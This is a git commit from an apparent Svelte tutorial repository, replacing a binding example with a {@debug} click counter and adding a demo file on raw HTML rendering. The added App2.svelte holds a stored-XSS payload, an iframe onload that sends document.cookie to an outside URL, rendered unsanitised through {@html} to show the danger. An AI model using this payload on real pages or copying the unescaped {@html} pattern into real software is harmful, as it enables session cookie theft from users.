b2ac3a4aa2886781073925004ff2c0606a5c1a4a
jyooj08 <jyooj08@naver.com>
2022-07-04 14:27:42 +0900

    원시 HTML, 데이터 디버깅

--- week2/interpolation/src/App.svelte
+++ week2/interpolation/src/App.svelte
@@ -1,23 +1,13 @@
 <script>
-  let href = "https://velog.io/@jyooj08";
-  let name = "Yujin";
-  let value = "New input value!";
-  let isUpperCase = false;
+  let name = "yujin";
+  let index = 0;
 </script>
 
-<!-- <a href="https://velog.io/@jyooj08">Yujin</a> -->
-
-<a {href}>{name}</a>
-
-<!-- <input type="text" value="Default value.." /> -->
-
-<!-- input의 기본 type값은 text이므로 생략 가능 -->
-<input
-  {value}
-  on:input={(e) => {
-    value = e.target.value;
+{@debug index, name}
+<h1
+  on:click={() => {
+    index++;
   }}
-/>
-<input bind:value />
-
-<div>{isUpperCase ? "DIV" : "div"}</div>
+>
+  Hello {name}!
+</h1>
---
+++ week2/interpolation/src/App2.svelte
@@ -0,0 +1,8 @@
+<script>
+  let h1 = "<h1>Hello Yujin</h1>";
+  let xss =
+    "<iframe onload='document.location=`https://naver.com?${document.cookie}`'></iframe>";
+</script>
+
+{@html h1}
+{@html xss}
